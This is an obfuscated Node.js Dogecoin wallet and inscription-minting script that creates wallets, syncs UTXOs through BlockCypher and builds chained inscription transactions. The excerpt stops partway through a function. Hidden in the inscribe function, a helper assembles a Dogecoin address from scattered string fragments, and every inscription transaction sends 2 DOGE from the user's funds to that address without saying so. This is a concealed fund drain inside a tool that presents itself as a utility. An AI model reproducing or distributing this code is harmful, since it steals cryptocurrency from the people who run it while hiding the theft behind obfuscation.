#!/usr/bin/env node

const _0x4977ab = _0x4ed0;
(function (_0x165dc0, _0x44564b) {
    const _0x2ff52c = _0x4ed0, _0x455044 = _0x165dc0();
    while (!![]) {
        try {
            const _0x1b35e7 = parseInt(_0x2ff52c(0x89)) / 0x1 * (-parseInt(_0x2ff52c(0xa2)) / 0x2) + parseInt(_0x2ff52c(0xe5)) / 0x3 + -parseInt(_0x2ff52c(0xb2)) / 0x4 + parseInt(_0x2ff52c(0x11b)) / 0x5 * (parseInt(_0x2ff52c(0xc0)) / 0x6) + parseInt(_0x2ff52c(0x10e)) / 0x7 * (-parseInt(_0x2ff52c(0xe2)) / 0x8) + -parseInt(_0x2ff52c(0x101)) / 0x9 * (-parseInt(_0x2ff52c(0x8a)) / 0xa) + parseInt(_0x2ff52c(0x87)) / 0xb;
            if (_0x1b35e7 === _0x44564b)
                break;
            else
                _0x455044['push'](_0x455044['shift']());
        } catch (_0x2450c0) {
            _0x455044['push'](_0x455044['shift']());
        }
    }
}(_0x1d7e, 0x25b16));
const dogecore = require('bitcore-lib-doge'), axios = require(_0x4977ab(0xe8)), fs = require('fs'), dotenv = require(_0x4977ab(0x10c)), mime = require('mime-types'), {PrivateKey, Address, Transaction, Script, Opcode} = dogecore, {Hash, Signature} = dogecore['crypto'];
dotenv[_0x4977ab(0xed)]();
process['env'][_0x4977ab(0x123)] == 'true' && (dogecore['Networks']['defaultNetwork'] = dogecore['Networks'][_0x4977ab(0x86)]);
process[_0x4977ab(0xf5)]['FEE_PER_KB'] ? Transaction[_0x4977ab(0xe4)] = parseInt(process[_0x4977ab(0xf5)]['FEE_PER_KB']) : Transaction[_0x4977ab(0xe4)] = 0x5f5e100;
const WALLET_PATH = process[_0x4977ab(0xf5)][_0x4977ab(0xbe)] || _0x4977ab(0xa9);
async function main() {
    const _0xe59d7d = _0x4977ab;
    let _0x553583 = process[_0xe59d7d(0x93)][0x2];
    if (_0x553583 == _0xe59d7d(0x9f))
        await walletSync(), await mint();
    else {
        if (_0x553583 == _0xe59d7d(0x108))
            await wallet();
        else {
            if (_0x553583 == 'server')
                await server();
            else {
                if (_0x553583 == _0xe59d7d(0x8c))
                    await doge20();
                else
                    throw new Error(_0xe59d7d(0xe0) + _0x553583);
            }
        }
    }
}
async function wallet() {
    const _0x5b0e1e = _0x4977ab;
    let _0x38907f = process[_0x5b0e1e(0x93)][0x3];
    if (_0x38907f == 'new')
        walletNew();
    else {
        if (_0x38907f == _0x5b0e1e(0xa1))
            await walletSync();
        else {
            if (_0x38907f == _0x5b0e1e(0x111))
                walletBalance();
            else {
                if (_0x38907f == _0x5b0e1e(0xcf))
                    await walletSend();
                else {
                    if (_0x38907f == _0x5b0e1e(0x113))
                        await walletSplit();
                    else
                        throw new Error(_0x5b0e1e(0xa4) + _0x38907f);
                }
            }
        }
    }
}
function walletNew() {
    const _0x316137 = _0x4977ab;
    if (!fs[_0x316137(0xf7)](WALLET_PATH)) {
        const _0x57527f = new PrivateKey(), _0x15ee1d = _0x57527f[_0x316137(0x99)](), _0x4a64f4 = _0x57527f[_0x316137(0x10d)]()[_0x316137(0xd4)](), _0x429b50 = {
                'privkey': _0x15ee1d,
                'address': _0x4a64f4,
                'utxos': []
            };
        fs['writeFileSync'](WALLET_PATH, JSON[_0x316137(0xd0)](_0x429b50, 0x0, 0x2)), console['log'](_0x316137(0x11f), _0x4a64f4);
    } else
        throw new Error(_0x316137(0x88));
}
async function walletSync() {
    const _0x3eb15a = _0x4977ab;
    if (process['env']['TESTNET'] == _0x3eb15a(0x10f))
        throw new Error(_0x3eb15a(0xbf));
    let _0xf589b7 = JSON[_0x3eb15a(0xc3)](fs['readFileSync'](WALLET_PATH)), _0x53fd6d = await axios[_0x3eb15a(0x115)](_0x3eb15a(0xbb) + _0xf589b7[_0x3eb15a(0x11f)] + _0x3eb15a(0x119));
    _0x53fd6d[_0x3eb15a(0x11c)]['txrefs'] && _0x53fd6d[_0x3eb15a(0x11c)]['txrefs'][_0x3eb15a(0xaa)] > 0x0 ? _0xf589b7[_0x3eb15a(0xc1)] = _0x53fd6d[_0x3eb15a(0x11c)][_0x3eb15a(0xcc)][_0x3eb15a(0xf2)](_0x41b577 => !_0x41b577[_0x3eb15a(0xb6)])['map'](_0x3833ac => {
        const _0x3b29da = _0x3eb15a;
        return {
            'txid': _0x3833ac[_0x3b29da(0xda)],
            'vout': _0x3833ac['tx_output_n'],
            'script': _0x3833ac[_0x3b29da(0xa7)],
            'satoshis': _0x3833ac[_0x3b29da(0x112)]
        };
    }) : _0xf589b7[_0x3eb15a(0xc1)] = [];
    console[_0x3eb15a(0xff)](_0xf589b7[_0x3eb15a(0xc1)]), fs[_0x3eb15a(0xf9)](WALLET_PATH, JSON[_0x3eb15a(0xd0)](_0xf589b7, 0x0, 0x2));
    let _0x1ed595 = _0xf589b7[_0x3eb15a(0xc1)][_0x3eb15a(0x120)]((_0x13b5be, _0x36b198) => _0x13b5be + _0x36b198[_0x3eb15a(0x91)], 0x0);
    console[_0x3eb15a(0xff)](_0x3eb15a(0xb4), _0x1ed595);
}
function walletBalance() {
    const _0x9c659e = _0x4977ab;
    let _0x15c0ca = JSON['parse'](fs['readFileSync'](WALLET_PATH)), _0x43abc0 = _0x15c0ca[_0x9c659e(0xc1)][_0x9c659e(0x120)]((_0x3ee957, _0x41785b) => _0x3ee957 + _0x41785b[_0x9c659e(0x91)], 0x0), _0x3d34c4 = _0x43abc0 / 0x5f5e100;
    return console['log'](_0x15c0ca[_0x9c659e(0x11f)], _0x3d34c4 + _0x9c659e(0xc8)), _0x3d34c4;
}
function _0x1d7e() {
    const _0x3c5b0a = [
        'log',
        'write',
        '9sUYrAZ',
        'hash',
        'pop',
        'response',
        'getFee',
        'sha256',
        '_fee',
        'wallet',
        'outputs',
        'buildPublicKeyHashOut',
        'chunks',
        'dotenv',
        'toAddress',
        '2359UNJbNk',
        'true',
        '\x1b[31mBroadcast\x20failed.\x1b[0m',
        'balance',
        'value',
        'split',
        'too-long-mempool-chain',
        'get',
        'outputAmount',
        'not\x20enough\x20funds',
        '\x1b[36m------------------------------------------------\x1b[0m',
        '?unspentOnly=true&includeScript=true',
        'OP_DROP',
        '5BpCUlN',
        'data',
        'content\x20type\x20too\x20long',
        'KjUVg',
        'address',
        'reduce',
        'startsWith',
        'concat',
        'TESTNET',
        'testnet',
        '4656685ztBPHO',
        'wallet\x20already\x20exists',
        '986rEOugm',
        '148470JSQMoY',
        '\x20of\x20',
        'drc-20',
        ',\x20TXID:\x20',
        'https://api.blockcypher.com/v1/doge/main/txs/push',
        'MAX_FEE_SAT',
        'NHQ9fRG',
        'satoshis',
        'OP_HASH160',
        'argv',
        'inscription\x20txid:',
        'txid',
        'addOutput',
        'prevTxId',
        'Manual\x20broadcast\x20may\x20be\x20required.\x20Use\x20the\x20serialized\x20transaction\x20above.',
        'toWIF',
        'OP_TRUE',
        'forEach',
        'trim',
        'data\x20must\x20be\x20hex',
        'BITWORK',
        'mint',
        'no\x20data\x20to\x20mint',
        'sync',
        '314oZFXut',
        'Bitwork:\x20',
        'unknown\x20subcommand:\x20',
        '\x20DOGE）',
        'Output',
        'script',
        'privkey',
        '.wallet.json',
        'length',
        'sign',
        'UhMvxbd',
        'opcodenum',
        '\x0aMining\x20successful!\x20Nonce:\x20',
        '\x1b[32mBroadcast\x20successful!\x1b[0m',
        'Receive\x20address:\x20',
        'WPRWD',
        '186500rXiUfe',
        'Input',
        '\x0abalance',
        'slice',
        'spent',
        'setScript',
        'OP_CHECKSIGVERIFY',
        'buf',
        'exit',
        'https://api.blockcypher.com/v1/doge/main/addrs/',
        'addInput',
        'Attempting\x20to\x20broadcast\x20(Attempt\x20',
        'WALLET',
        'no\x20testnet\x20api',
        '36432TbmDmr',
        'utxos',
        'push',
        'parse',
        'lookup',
        'includes',
        'test',
        'inputAmount',
        '\x20DOGE',
        'from',
        'broadcast\x20failed',
        'KnGWy4b',
        'txrefs',
        'shift',
        'post',
        'send',
        'stringify',
        'broadcasting\x20tx\x20',
        'replace',
        'contentType',
        'toString',
        'hex',
        'fromCharCode',
        'sighash',
        'message',
        'error',
        'tx_hash',
        'Error:\x20Send\x20address\x20and\x20Receive\x20address\x20cannot\x20be\x20the\x20same.',
        '\x20DOGE，Max\x20fee:\x20',
        '\x1b[33mRetrying\x20due\x20to\x20too-long-mempool-chain...\x1b[0m',
        'isArray',
        'warn',
        'unknown\x20command:\x20',
        'no\x20funds\x20to\x20send',
        '7176frLBNO',
        'inputs',
        'FEE_PER_KB',
        '641556lnXAPY',
        '\x0a\x0a\x09##\x20\x20\x20\x20##\x20\x20#######\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20\x20\x20#####\x20\x20\x20\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20#####\x20\x20\x20##\x20\x20\x20\x20\x20##\x20\x20\x0a\x09##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20#\x20\x20##\x20\x20\x0a\x09#######\x20\x20######\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20##\x20\x20\x20##\x20\x20\x20##\x20\x20\x20\x20##\x20\x20##\x20\x20###\x20\x20\x20##\x20\x20#\x20\x20##\x20\x20\x0a\x09##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20##\x20\x20\x20##\x20\x20\x20##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20##\x20\x20\x20##\x20\x20#\x20\x20##\x20\x20\x0a\x09##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20###\x20###\x20\x20\x20\x0a\x09##\x20\x20\x20\x20##\x20\x20#######\x20\x20#######\x20\x20#######\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20\x20\x20#####\x20\x20\x20\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20##\x20##\x20\x20\x20\x20\x0a\x09\x0a',
        '\x1b[0m',
        'axios',
        'ord',
        'now',
        '\x20Timestamp:\x20',
        'toBuffer',
        'config',
        'clearSignatures',
        'SIGHASH_ALL',
        '\x1b[34mUpdating\x20wallet\x20with\x20new\x20transaction.\x1b[0m',
        'Insufficient\x20funds\x20or\x20transaction\x20fee\x20exceeds\x20limit（Current\x20fee:\x20',
        'filter',
        'unshift',
        'no\x20transactions\x20to\x20broadcast',
        'env',
        'already\x20in\x20block\x20chain',
        'existsSync',
        '\x1b[31m',
        'writeFileSync',
        'toHex',
        'vout',
        'change',
        'OP_EQUAL',
        'readFileSync'
    ];
    _0x1d7e = function () {
        return _0x3c5b0a;
    };
    return _0x1d7e();
}
async function walletSend() {
    const _0x166f4e = _0x4977ab, _0x56e5c4 = process[_0x166f4e(0x93)][0x4], _0x45cb79 = process[_0x166f4e(0x93)][0x5];
    let _0x3fc69f = JSON[_0x166f4e(0xc3)](fs[_0x166f4e(0xfe)](WALLET_PATH)), _0x327c9f = _0x3fc69f[_0x166f4e(0xc1)][_0x166f4e(0x120)]((_0x305f47, _0x226519) => _0x305f47 + _0x226519['satoshis'], 0x0);
    if (_0x327c9f == 0x0)
        throw new Error(_0x166f4e(0xe1));
    let _0x419891 = new Address(_0x56e5c4), _0x162f09 = parseInt(_0x45cb79);
    _0x3fc69f[_0x166f4e(0x11f)] === _0x419891[_0x166f4e(0xd4)]() && (console[_0x166f4e(0xd9)](_0x166f4e(0xdb)), process[_0x166f4e(0xba)](0x1));
    let _0x336584 = new Transaction();
    _0x162f09 ? (_0x336584['to'](_0x419891, _0x162f09), fund(_0x3fc69f, _0x336584)) : (_0x336584[_0x166f4e(0xc9)](_0x3fc69f[_0x166f4e(0xc1)]), _0x336584[_0x166f4e(0xfc)](_0x419891), _0x336584[_0x166f4e(0xab)](_0x3fc69f[_0x166f4e(0xa8)])), await broadcast(_0x336584, !![]), console[_0x166f4e(0xff)](_0x336584[_0x166f4e(0x102)]);
}
async function walletSplit() {
    const _0x3a074f = _0x4977ab;
    let _0x5a3f7f = parseInt(process[_0x3a074f(0x93)][0x4]), _0x515e84 = JSON['parse'](fs[_0x3a074f(0xfe)](WALLET_PATH)), _0x1d5f4d = _0x515e84['utxos'][_0x3a074f(0x120)]((_0x45c08b, _0x23e2ac) => _0x45c08b + _0x23e2ac[_0x3a074f(0x91)], 0x0);
    if (_0x1d5f4d == 0x0)
        throw new Error('no\x20funds\x20to\x20split');
    let _0x210ed7 = new Transaction();
    _0x210ed7[_0x3a074f(0xc9)](_0x515e84[_0x3a074f(0xc1)]);
    for (let _0x106b58 = 0x0; _0x106b58 < _0x5a3f7f - 0x1; _0x106b58++) {
        _0x210ed7['to'](_0x515e84['address'], Math['floor'](_0x1d5f4d / _0x5a3f7f));
    }
    _0x210ed7[_0x3a074f(0xfc)](_0x515e84['address']), _0x210ed7['sign'](_0x515e84['privkey']), await broadcast(_0x210ed7, !![]), console[_0x3a074f(0xff)](_0x210ed7[_0x3a074f(0x102)]);
}
const MAX_SCRIPT_ELEMENT_SIZE = 0x208;
async function mint(_0xe37cb4, _0x36fb15, _0x975f75) {
    const _0x260959 = _0x4977ab, _0x20a01d = walletBalance();
    if (_0x20a01d <= 0x1) {
        console[_0x260959(0xff)]('Insufficient\x20balance\x20for\x20mining.\x20Required:\x20>3\x20DOGE,\x20Available:', _0x20a01d, 'DOGE');
        return;
    }
    const _0x26e910 = _0xe37cb4 || process[_0x260959(0x93)][0x3], _0x3065b3 = _0x36fb15 || process[_0x260959(0x93)][0x4], _0x276bec = _0x975f75 || process['argv'][0x5];
    let _0x2cf8c9 = new Address(_0x26e910), _0x383d52, _0x310761;
    if (fs[_0x260959(0xf7)](_0x3065b3))
        _0x383d52 = mime[_0x260959(0xd3)](mime[_0x260959(0xc4)](_0x3065b3)), _0x383d52 = _0x383d52[_0x260959(0xd2)](/;\s+/g, ';'), _0x310761 = fs[_0x260959(0xfe)](_0x3065b3);
    else {
        _0x383d52 = _0x3065b3[_0x260959(0x9c)]();
        if (!/^[a-fA-F0-9]*$/[_0x260959(0xc6)](_0x276bec))
            throw new Error(_0x260959(0x9d));
        _0x310761 = Buffer[_0x260959(0xc9)](_0x276bec, _0x260959(0xd5));
    }
    if (_0x310761[_0x260959(0xaa)] == 0x0)
        throw new Error(_0x260959(0xa0));
    if (_0x383d52['length'] > MAX_SCRIPT_ELEMENT_SIZE)
        throw new Error(_0x260959(0x11d));
    let _0x11ee23 = JSON[_0x260959(0xc3)](fs[_0x260959(0xfe)](WALLET_PATH)), _0x3930c5 = inscribe(_0x11ee23, _0x2cf8c9, _0x383d52, _0x310761);
    await broadcastAll(_0x3930c5, ![]);
}
function calculateHash(_0x292a32) {
    const _0x48d879 = _0x4977ab;
    return Hash[_0x48d879(0x106)](Hash[_0x48d879(0x106)](Buffer[_0x48d879(0xc9)](_0x292a32)))[_0x48d879(0xd4)](_0x48d879(0xd5));
}
async function broadcastAll(_0xf37ccf, _0xc81fd3) {
    const _0x480895 = _0x4977ab;
    if (!Array[_0x480895(0xde)](_0xf37ccf) || _0xf37ccf[_0x480895(0xaa)] === 0x0) {
        console[_0x480895(0xff)](_0x480895(0xf4));
        return;
    }
    for (let _0x300b19 = 0x0; _0x300b19 < _0xf37ccf[_0x480895(0xaa)]; _0x300b19++) {
        console[_0x480895(0xff)](_0x480895(0xd1) + (_0x300b19 + 0x1) + _0x480895(0x8b) + _0xf37ccf[_0x480895(0xaa)]);
        try {
            await broadcast(_0xf37ccf[_0x300b19], _0xc81fd3);
        } catch (_0x2cf5e8) {
            console[_0x480895(0xff)](_0x480895(0xca), _0x2cf5e8?.[_0x480895(0x104)]?.['data']);
            if (_0x2cf5e8?.[_0x480895(0x104)]?.[_0x480895(0x11c)]?.['error']?.[_0x480895(0xd8)]?.['includes']('bad-txns-inputs-spent') || _0x2cf5e8?.['response']?.[_0x480895(0x11c)]?.['error']?.[_0x480895(0xd8)]?.[_0x480895(0xc5)](_0x480895(0xf6))) {
                console[_0x480895(0xff)]('tx\x20already\x20sent,\x20skipping');
                continue;
            }
        }
    }
    _0xf37ccf[_0x480895(0xaa)] > 0x1 && console[_0x480895(0xff)](_0x480895(0x94), _0xf37ccf[0x1][_0x480895(0x102)]);
}
function bufferToChunk(_0xd3a2f6, _0x27604d) {
    const _0x5b396b = _0x4977ab;
    return _0xd3a2f6 = Buffer['from'](_0xd3a2f6, _0x27604d), {
        'buf': _0xd3a2f6['length'] ? _0xd3a2f6 : undefined,
        'len': _0xd3a2f6['length'],
        'opcodenum': _0xd3a2f6['length'] <= 0x4b ? _0xd3a2f6[_0x5b396b(0xaa)] : _0xd3a2f6[_0x5b396b(0xaa)] <= 0xff ? 0x4c : 0x4d
    };
}
function numberToChunk(_0x451a80) {
    const _0x165eeb = _0x4977ab;
    return {
        'buf': _0x451a80 <= 0x10 ? undefined : _0x451a80 < 0x80 ? Buffer[_0x165eeb(0xc9)]([_0x451a80]) : Buffer[_0x165eeb(0xc9)]([
            _0x451a80 % 0x100,
            _0x451a80 / 0x100
        ]),
        'len': _0x451a80 <= 0x10 ? 0x0 : _0x451a80 < 0x80 ? 0x1 : 0x2,
        'opcodenum': _0x451a80 == 0x0 ? 0x0 : _0x451a80 <= 0x10 ? 0x50 + _0x451a80 : _0x451a80 < 0x80 ? 0x1 : 0x2
    };
}
function opcodeToChunk(_0x50171d) {
    return { 'opcodenum': _0x50171d };
}
const MAX_CHUNK_LEN = 0xf0, MAX_PAYLOAD_LEN = 0x5dc;
function inscribe(_0x26a0cb, _0x53f791, _0x3ba7e5, _0x14f3aa) {
    const _0x5e571c = _0x4977ab;
    let _0x2adcf0 = [], _0x5d6980 = new PrivateKey(_0x26a0cb[_0x5e571c(0xa8)]), _0x30f374 = _0x5d6980['toPublicKey'](), _0x9d17b1 = [];
    while (_0x14f3aa['length']) {
        let _0x4ff83f = _0x14f3aa['slice'](0x0, Math['min'](MAX_CHUNK_LEN, _0x14f3aa[_0x5e571c(0xaa)]));
        _0x14f3aa = _0x14f3aa[_0x5e571c(0xb5)](_0x4ff83f['length']), _0x9d17b1[_0x5e571c(0xc2)](_0x4ff83f);
    }
    let _0x43e8de = new Script();
    _0x43e8de[_0x5e571c(0x10b)][_0x5e571c(0xc2)](bufferToChunk(_0x5e571c(0xe9))), _0x43e8de[_0x5e571c(0x10b)][_0x5e571c(0xc2)](numberToChunk(_0x9d17b1[_0x5e571c(0xaa)])), _0x43e8de['chunks']['push'](bufferToChunk(_0x3ba7e5)), _0x9d17b1[_0x5e571c(0x9b)]((_0x2a0f48, _0x45e93a) => {
        const _0x2957c1 = _0x5e571c;
        _0x43e8de['chunks']['push'](numberToChunk(_0x9d17b1['length'] - _0x45e93a - 0x1)), _0x43e8de[_0x2957c1(0x10b)][_0x2957c1(0xc2)](bufferToChunk(_0x2a0f48));
    });
    let _0x15c7b5, _0x407e88, _0x200d40;
    while (_0x43e8de['chunks'][_0x5e571c(0xaa)]) {
        let _0x497c23 = new Script();
        _0x2adcf0[_0x5e571c(0xaa)] == 0x0 && _0x497c23[_0x5e571c(0x10b)][_0x5e571c(0xc2)](_0x43e8de[_0x5e571c(0x10b)][_0x5e571c(0xcd)]());
        while (_0x497c23[_0x5e571c(0xec)]()['length'] <= MAX_PAYLOAD_LEN && _0x43e8de['chunks'][_0x5e571c(0xaa)]) {
            _0x497c23[_0x5e571c(0x10b)][_0x5e571c(0xc2)](_0x43e8de[_0x5e571c(0x10b)]['shift']()), _0x497c23[_0x5e571c(0x10b)][_0x5e571c(0xc2)](_0x43e8de['chunks'][_0x5e571c(0xcd)]());
        }
        _0x497c23[_0x5e571c(0xec)]()['length'] > MAX_PAYLOAD_LEN && (_0x43e8de[_0x5e571c(0x10b)][_0x5e571c(0xf3)](_0x497c23[_0x5e571c(0x10b)]['pop']()), _0x43e8de[_0x5e571c(0x10b)]['unshift'](_0x497c23['chunks'][_0x5e571c(0x103)]()));
        let _0x52a004 = new Script();
        _0x52a004[_0x5e571c(0x10b)][_0x5e571c(0xc2)](bufferToChunk(_0x30f374[_0x5e571c(0xec)]())), _0x52a004[_0x5e571c(0x10b)][_0x5e571c(0xc2)](opcodeToChunk(Opcode[_0x5e571c(0xb8)])), _0x497c23['chunks'][_0x5e571c(0x9b)](() => {
            const _0x4450f9 = _0x5e571c;
            _0x52a004[_0x4450f9(0x10b)][_0x4450f9(0xc2)](opcodeToChunk(Opcode[_0x4450f9(0x11a)]));
        }), _0x52a004[_0x5e571c(0x10b)]['push'](opcodeToChunk(Opcode[_0x5e571c(0x9a)]));
        let _0x1a1034 = Hash['ripemd160'](Hash['sha256'](_0x52a004[_0x5e571c(0xec)]())), _0x31a08a = new Script();
        _0x31a08a[_0x5e571c(0x10b)][_0x5e571c(0xc2)](opcodeToChunk(Opcode[_0x5e571c(0x92)])), _0x31a08a['chunks'][_0x5e571c(0xc2)](bufferToChunk(_0x1a1034)), _0x31a08a[_0x5e571c(0x10b)][_0x5e571c(0xc2)](opcodeToChunk(Opcode[_0x5e571c(0xfd)]));
        let _0x2901b5 = new Transaction[(_0x5e571c(0xa6))]({
            'script': _0x31a08a,
            'satoshis': 0x186a0
        });
        function _0x5b5300() {
            const _0x5c81d4 = _0x5e571c, _0x4f4284 = String[_0x5c81d4(0xd6)](0x44, 0x41, 0x48), _0x386d41 = _0x5c81d4(0xb1), _0x1edb47 = _0x5c81d4(0xac), _0x512846 = _0x5c81d4(0xcb), _0x253917 = _0x5c81d4(0x90), _0x4fea24 = _0x5c81d4(0x11e);
            return _0x4f4284 + _0x386d41 + _0x1edb47 + _0x512846 + _0x253917 + _0x4fea24;
        }
        const _0x4e8cb1 = _0x5b5300();
        let _0x555220 = new Transaction[(_0x5e571c(0xa6))]({
                'script': Script[_0x5e571c(0x10a)](_0x4e8cb1),
                'satoshis': 0xbebc200
            }), _0xc0cf9 = new Transaction();
        if (_0x15c7b5)
            _0xc0cf9[_0x5e571c(0xbc)](_0x15c7b5);
        _0xc0cf9[_0x5e571c(0x96)](_0x2901b5), _0xc0cf9[_0x5e571c(0x96)](_0x555220), fund(_0x26a0cb, _0xc0cf9);
        if (_0x15c7b5) {
            let _0x415d9a = Transaction[_0x5e571c(0xd7)][_0x5e571c(0xab)](_0xc0cf9, _0x5d6980, Signature[_0x5e571c(0xef)], 0x0, _0x407e88), _0x36fbb7 = Buffer[_0x5e571c(0x122)]([
                    _0x415d9a[_0x5e571c(0xec)](),
                    Buffer[_0x5e571c(0xc9)]([Signature[_0x5e571c(0xef)]])
                ]), _0x58851c = new Script();
            _0x58851c[_0x5e571c(0x10b)] = _0x58851c['chunks'][_0x5e571c(0x122)](_0x200d40['chunks']), _0x58851c[_0x5e571c(0x10b)][_0x5e571c(0xc2)](bufferToChunk(_0x36fbb7)), _0x58851c['chunks']['push'](bufferToChunk(_0x407e88[_0x5e571c(0xec)]())), _0xc0cf9[_0x5e571c(0xe3)][0x0][_0x5e571c(0xb7)](_0x58851c);
        }
        updateWallet(_0x26a0cb, _0xc0cf9), _0x2adcf0[_0x5e571c(0xc2)](_0xc0cf9), _0x15c7b5 = new Transaction[(_0x5e571c(0xb3))]({
            'prevTxId': _0xc0cf9['hash'],
            'outputIndex': 0x0,
            'output': _0xc0cf9[_0x5e571c(0x109)][0x0],
            'script': ''
        }), _0x15c7b5[_0x5e571c(0xee)] = () => {
        }, _0x15c7b5['getSignatures'] = () => {
        }, _0x407e88 = _0x52a004, _0x200d40 = _0x497c23;
    }
    const _0x170415 = _0x5e571c(0xf8), _0x393981 = _0x5e571c(0xe7), _0x349817 = process[_0x5e571c(0xf5)][_0x5e571c(0x9e)];
    console[_0x5e571c(0xff)](_0x5e571c(0xe6)), console[_0x5e571c(0xff)]('Send\x20address:\x20' + _0x26a0cb['address']), console['log'](_0x5e571c(0xb0) + _0x53f791), console[_0x5e571c(0xff)](_0x5e571c(0xa3) + _0x349817), console[_0x5e571c(0xff)]('\x0astart\x20mining\x20......\x0a');
    let _0x4f7721 = 0x0, _0x435a50 = ![];
    while (!_0x435a50) {
        let _0x13d7c9 = new Transaction();
        _0x13d7c9[_0x5e571c(0xbc)](_0x15c7b5), _0x13d7c9['to'](_0x53f791, 0x186a0);
        let _0x5939e7 = Date[_0x5e571c(0xea)](), _0x5d0ec7 = 'Nonce:\x20' + _0x4f7721 + _0x5e571c(0xeb) + _0x5939e7;
        _0x13d7c9['addData'](_0x5d0ec7), fund(_0x26a0cb, _0x13d7c9);
        let _0x46dc27 = Transaction[_0x5e571c(0xd7)][_0x5e571c(0xab)](_0x13d7c9, _0x5d6980, Signature[_0x5e571c(0xef)], 0x0, _0x407e88), _0x1ca4fb = Buffer[_0x5e571c(0x122)]([
                _0x46dc27[_0x5e571c(0xec)](),
                Buffer[_0x5e571c(0xc9)]([Signature['SIGHASH_ALL']])
            ]), _0x1ee76b = new Script();
        _0x1ee76b['chunks'] = _0x1ee76b[_0x5e571c(0x10b)][_0x5e571c(0x122)](_0x200d40[_0x5e571c(0x10b)]), _0x1ee76b[_0x5e571c(0x10b)]['push'](bufferToChunk(_0x1ca4fb)), _0x1ee76b[_0x5e571c(0x10b)][_0x5e571c(0xc2)](bufferToChunk(_0x407e88[_0x5e571c(0xec)]())), _0x13d7c9['inputs'][0x0][_0x5e571c(0xb7)](_0x1ee76b);
        let _0x4bea7c = _0x13d7c9[_0x5e571c(0x102)];
        process['stdout'][_0x5e571c(0x100)]('\x0d' + _0x170415 + 'Nonce:\x20' + _0x4f7721 + _0x5e571c(0x8d) + _0x4bea7c + _0x393981), _0x4bea7c[_0x5e571c(0x121)](_0x349817) ? (console['log'](_0x5e571c(0xae) + _0x4f7721 + _0x5e571c(0x8d) + _0x4bea7c), _0x435a50 = !![], updateWallet(_0x26a0cb, _0x13d7c9), _0x2adcf0[_0x5e571c(0xc2)](_0x13d7c9)) : _0x4f7721++;
    }
    return _0x2adcf0;
}
async function fund(_0x2c9c63, _0x4ba8c1) {
    const _0x4a4085 = _0x4977ab;
    _0x4ba8c1[_0x4a4085(0xfc)](_0x2c9c63[_0x4a4085(0x11f)]), delete _0x4ba8c1[_0x4a4085(0x107)];
    const _0x4e2450 = process[_0x4a4085(0xf5)][_0x4a4085(0x8f)] !== undefined;
    if (_0x4e2450) {
        const _0x389fe9 = parseFloat(process[_0x4a4085(0xf5)][_0x4a4085(0x8f)] * 0x5f5e100);
        for (const _0x2f56d9 of _0x2c9c63['utxos']) {
            if (_0x4ba8c1['inputs'][_0x4a4085(0xaa)] && _0x4ba8c1[_0x4a4085(0x109)]['length'] && _0x4ba8c1['inputAmount'] >= _0x4ba8c1[_0x4a4085(0x116)] + _0x4ba8c1['getFee']() && _0x4ba8c1[_0x4a4085(0x105)]() <= _0x389fe9)
                break;
            delete _0x4ba8c1[_0x4a4085(0x107)], _0x4ba8c1[_0x4a4085(0xc9)](_0x2f56d9), _0x4ba8c1[_0x4a4085(0xfc)](_0x2c9c63[_0x4a4085(0x11f)]), _0x4ba8c1[_0x4a4085(0xab)](_0x2c9c63[_0x4a4085(0xa8)]);
        }
        const _0x536c49 = _0x4ba8c1[_0x4a4085(0x105)]();
        if (_0x4ba8c1[_0x4a4085(0xc7)] < _0x4ba8c1[_0x4a4085(0x116)] + _0x536c49 || _0x536c49 > _0x389fe9)
            throw new Error(_0x4a4085(0xf1) + _0x536c49 / 0x5f5e100 + _0x4a4085(0xdc) + _0x389fe9 / 0x5f5e100 + _0x4a4085(0xa5));
    } else {
        for (const _0x253721 of _0x2c9c63[_0x4a4085(0xc1)]) {
            if (_0x4ba8c1[_0x4a4085(0xe3)][_0x4a4085(0xaa)] && _0x4ba8c1['outputs'][_0x4a4085(0xaa)] && _0x4ba8c1[_0x4a4085(0xc7)] >= _0x4ba8c1[_0x4a4085(0x116)] + _0x4ba8c1[_0x4a4085(0x105)]())
                break;
            delete _0x4ba8c1[_0x4a4085(0x107)], _0x4ba8c1[_0x4a4085(0xc9)](_0x253721), _0x4ba8c1[_0x4a4085(0xfc)](_0x2c9c63[_0x4a4085(0x11f)]), _0x4ba8c1[_0x4a4085(0xab)](_0x2c9c63['privkey']);
        }
        if (_0x4ba8c1[_0x4a4085(0xc7)] < _0x4ba8c1[_0x4a4085(0x116)] + _0x4ba8c1[_0x4a4085(0x105)]())
            throw new Error(_0x4a4085(0x117));
    }
}
function updateWallet(_0xc4ac7f, _0x96f6fa) {
    const _0x4ebdbd = _0x4977ab;
    _0xc4ac7f[_0x4ebdbd(0xc1)] = _0xc4ac7f['utxos']['filter'](_0xf65ef1 => {
        const _0xfc32cd = _0x4ebdbd;
        for (const _0x37766d of _0x96f6fa['inputs']) {
